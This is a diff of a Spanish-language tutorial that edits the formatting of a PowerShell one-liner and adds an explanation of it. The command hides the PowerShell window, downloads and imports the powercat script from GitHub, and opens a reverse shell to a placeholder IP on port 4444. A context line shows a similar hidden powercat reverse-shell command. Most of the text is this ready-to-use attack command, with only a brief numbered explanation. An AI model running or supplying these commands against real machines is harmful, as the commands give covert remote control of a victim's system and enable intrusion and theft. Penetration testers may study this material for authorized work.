@@ -36,6 +36,11 @@ Ahora, cuando te conectes desde tu máquina Linux, obtendrás una shell de Power
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & {powercat -c <ip-address> -p 4444 -ep powershell}" 
    ```
 ### Unificar descarga de Powercat, inicio de una shell remota con la ventana de PowerShell oculta con el siguiente comando:
-```
-Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & {Invoke-WebRequest 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' -OutFile powercat.ps1; Import-Module ./powercat.ps1; powercat -c <ip-address> -p 4444 -ep powershell}" 
-```
+   ```
+   Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & {Invoke-WebRequest 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' -OutFile powercat.ps1; Import-Module ./powercat.ps1; powercat -c <ip-address> -p 4444 -ep powershell}" 
+   ```
+Este comando realiza las siguientes acciones:
+
+1. Inicia un nuevo proceso de PowerShell con la ventana oculta.
+2. Descarga el módulo Powercat e importa el módulo.
+3. Establece la shell remota.
